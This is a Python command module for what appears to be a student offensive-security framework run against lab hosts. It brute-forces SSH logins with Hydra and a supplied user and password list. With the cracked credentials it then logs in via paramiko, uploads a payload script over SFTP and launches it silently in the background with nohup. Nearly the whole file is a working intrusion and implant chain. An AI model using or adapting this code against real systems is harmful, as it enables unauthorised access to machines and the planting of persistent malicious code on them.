from ..commands import Command
import subprocess
import shutil
import os
import re
import paramiko

# cred_bash e1-target.local ssh usernames.txt passwords.txt
# ps aux | grep [s]evro.py
# PID number is the first number (like 51423)
# Do kill 51423 to kill process gracefully

class PasswordBash(Command):
    """
    Usage: cred_bash <target> <service> <user_list> <pass_list>
    Example: cred_bash e1-target.local ssh usernames.txt passwords.txt
    """

    def do_command(self, lines: str, *args):
        # Local helper to handle installation check within the command scope
        def check_hydra():
            if shutil.which("hydra") is not None:
                return True
            print("[-] Error: 'hydra' is not installed.")
            choice = input("[?] Install via apt? (y/n): ").strip().lower()
            if choice == 'y':
                try:
                    subprocess.run(["sudo", "apt", "update"], check=True)
                    subprocess.run(["sudo", "apt", "install", "-y", "hydra"], check=True)
                    return True
                except: 
                    return False
            return False

        # 1. Parse the options from the user input
        parts = lines.split()
        if len(parts) < 4:
            print("[-] Error: Missing arguments.")
            print("Usage: cred_bash <target> <service> <user_list> <pass_list>")
            print("Example: cred_bash e1-target.local ssh my_users.txt my_pass.txt")
            return

        if not check_hydra():
            return

        # Assign variables based on user input
        target = parts[0]
        service = parts[1].lower()
        user_list_input = parts[2]
        pass_list_input = parts[3]

        # For this integration, assume we're brute-forcing SSH credentials
        if service != 'ssh':
            print("[-] Error: This integrated command only supports SSH for now. Use 'ssh' as the service.")
            return

        # Define the relative path to your commands folder
        # This keeps the files organized inside your oreo_client structure
        base_path = "oreo_client/commands/"
        user_list = os.path.join(base_path, user_list_input)
        pass_list = os.path.join(base_path, pass_list_input)

        # Check if the files actually exist before running to avoid Hydra errors
        if not os.path.exists(user_list):
            print(f"[-] Error: User list not found at {user_list}")
            return
        if not os.path.exists(pass_list):
            print(f"[-] Error: Password list not found at {pass_list}")
            return

        print(f"[*] Preparing to audit {service} on {target} using lists: {user_list_input}, {pass_list_input}...")

        # 2. Construct the command list
        audit_command = [
            "hydra",
            "-I",                   # Skip 10s wait
            "-q",                   # Quiet mode
            "-L", user_list,        # User-provided user list
            "-P", pass_list,        # User-provided password list
            "-f",                   # Exit when the first valid pair is found
            "-V",                   # Verbose (show attempts)
            target,
            service
        ]

        print(f"[*] Running command: {' '.join(audit_command)}")

        try:
            # Run Hydra with live output and capture for parsing
            process = subprocess.Popen(audit_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            output = ""
            for line in iter(process.stdout.readline, ''):
                print(line, end='')
                output += line
            process.stdout.close()
            process.wait()

            if process.returncode == 0:
                print("\n[+] Audit completed successfully.")
            else:
                print(f"\n[!] Hydra finished with exit code {process.returncode}")

            # Parse the output for successful credentials
            # Example Hydra success line: [22][ssh] host: e1-target.local   login: e1-target   password: aotismyfavoriteanime
            match = re.search(r'\[\d+\]\[{}\] host: .+   login: (\S+)   password: (\S+)'.format(service), output)
            if match:
                found_user = match.group(1)
                found_pass = match.group(2)
                print(f"\n[+] Found valid credentials: {found_user}:{found_pass}")
            else:
                print("\n[-] No valid credentials found in output.")
                return

            # Now proceed to SSH connection, file upload, and execution using the found credentials
            print("\n[*] Attempting SSH connection with found credentials...")

            port = 22  # Default SSH port
            local_path = "/home/e1-attack/Desktop/final-project-theoreos/payload/server.py"  # Adjust if needed
            remote_path = f"/home/{found_user}/Desktop/sevro.py"  # Dynamically use the found username for home dir

            client = None
            try:
                # Create an SSH client instance
                client = paramiko.SSHClient()
                
                # Automatically add untrusted hosts (use only in trusted environments)
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Connect to the server
                client.connect(hostname=target, port=port, username=found_user, password=found_pass, look_for_keys=False, 
                               allow_agent=False, timeout=10)
                
                print(f"Successfully connected to {target}")
                
                # Execute a command (optional, for verification)
                stdin, stdout, stderr = client.exec_command('ls -l')  # Example command
                print(stdout.read().decode())  # Print the command output

                # Uploading file through SFTP
                sftp = client.open_sftp()
                
                print(f"Uploading {local_path} to {remote_path}...")
                sftp.put(local_path, remote_path)
                
                sftp.close()
                print("Upload complete!")

                print("Executing the script...")
                client.exec_command(f"chmod +x {remote_path} && nohup python3 {remote_path} > /dev/null 2>&1 &")
                print("Command to execute sent!")
                
            except paramiko.AuthenticationException:
                print("Authentication failed with found credentials (unexpected, since Hydra succeeded)")
            except paramiko.SSHException as e:
                print(f"Failed to connect to {target}: {e}")
            except Exception as e:
                print(f"Unexpected error during SSH: {e}")
            finally:
                if client:
                    client.close()  # Close the connection

        except Exception as e:
            print(f"[-] An unexpected error occurred: {e}")

command = PasswordBash